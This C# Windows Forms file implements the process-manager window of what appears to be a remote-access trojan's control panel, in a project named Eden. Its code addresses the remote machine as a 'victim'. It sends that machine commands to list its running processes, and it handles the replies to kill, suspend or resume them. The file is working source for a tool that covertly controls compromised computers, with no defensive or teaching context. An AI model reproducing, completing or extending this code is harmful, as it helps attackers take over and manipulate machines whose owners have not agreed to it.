using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Text;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmTaskMgr : Form
    {
        private clsVictim m_victim;
        public string m_szVictimID;

        public frmTaskMgr(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
            m_szVictimID = victim.m_szID;
        }

        void fnRecv(clsClient clnt, string szVictimID, List<string> lsMsg)
        {
            if (!string.Equals(szVictimID, m_szVictimID))
                return;
            
            if (lsMsg[0] == "proc")
            {
                if (lsMsg[1] == "ls")
                {
                    int nCode = int.Parse(lsMsg[2]);
                    if (nCode == 0)
                    {
                        MessageBox.Show(EZCrypto.Encoder.b64d2str(lsMsg[3]));
                        return;
                    }

                    var ls = clsTools.EZData.String2TwoDList(lsMsg[3]);
                    foreach (var x in ls)
                    {
                        ListViewItem item = new ListViewItem(x.First());
                        for (int i = 1; i < x.Count; i++)
                            item.SubItems.Add(x[i]);

                        Invoke(new Action(() =>
                        {
                            listView1.Items.Add(item);
                            toolStripStatusLabel1.Text = $"Process[{listView1.Items.Count}]";
                        }));
                    }
                }
                else if (lsMsg[1] == "kill")
                {
                    int nCode = int.Parse(lsMsg[2]);
                    int nPid = int.Parse(lsMsg[3]);

                    Invoke(new Action(() => toolStripStatusLabel1.Text = nCode == 1 ? "Action successfully." : "Action failed."));
                }
                else if (lsMsg[1] == "suspend")
                {
                    int nCode = int.Parse(lsMsg[2]);
                    int nPid = int.Parse(lsMsg[3]);

                    Invoke(new Action(() => toolStripStatusLabel1.Text = nCode == 1 ? "Action successfully." : "Action failed."));
                }
                else if (lsMsg[1] == "resume")
                {
                    int nCode = int.Parse(lsMsg[2]);
                    int nPid = int.Parse(lsMsg[3]);

                    Invoke(new Action(() => toolStripStatusLabel1.Text = nCode == 1 ? "Action successfully." : "Action failed."));
                }
            }
        }

        void fnGetProcesses()
        {
            listView1.Items.Clear();

            toolStripStatusLabel1.Text = "Loading...";

            m_victim.fnSendCommand(new string[]
            {
                "Process",
                "ls",
            });
        }

        void fnSetup()
        {
            m_victim.m_clnt.ServerMessageReceived += fnRecv;

            StartPosition = FormStartPosition.CenterScreen;
            listView1.View = View.Details;
            listView1.FullRowSelect = true;
            listView1.MultiSelect = true;

            listView1.Columns.Add("Pid", 50);
            listView1.Columns.Add("Name", 150);
            listView1.Columns.Add("Status", 120);
            listView1.Columns.Add("PPid", 50);
            listView1.Columns.Add("uid", 50);
            listView1.Columns.Add("VmRSS", 120);
            listView1.Columns.Add("VmSize", 120);
            listView1.Columns.Add("CmdLine", 200);
            listView1.Columns.Add("uTime", 120);
            listView1.Columns.Add("sTime", 120);

            fnGetProcesses();
        }

        private void frmTaskMgr_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void frmTaskMgr_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_clnt.ServerMessageReceived -= fnRecv;
        }
    }
}
